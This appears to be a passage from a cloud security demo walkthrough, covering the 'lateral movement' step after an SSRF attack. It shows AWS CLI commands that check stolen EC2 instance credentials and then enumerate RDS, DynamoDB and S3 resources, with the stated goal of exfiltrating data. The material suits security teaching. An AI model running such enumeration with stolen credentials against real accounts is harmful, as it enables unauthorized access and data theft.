## Lateral movement

1.  First, check that the profile has been configured correctly by executing a get-caller-identity API call.

```script
    aws sts get-caller-identity --profile ssrf-demo
```

2.  Now that we have live credentials of the ec2 instance, we can begin our reconaissance looking for what else might be in the account.

Remembering our goal is to exfiltrate data, let's see whether we can find any data stores that this ec2 instance might have access to.

```script
    aws rds describe-db-instances --profile ssrf-demo
    aws dynamodb list-tables --profile ssrf-demo
    aws s3 ls --profile ssrf-demo
```

The first two calls didn't work, but it seems that this role has the ability to list buckets.  Let's see keep going down this track, and see whether we can find anything further in this bucket.  This process is called `enumeration`. 

```script
    aws s3 ls {bucket_name}
```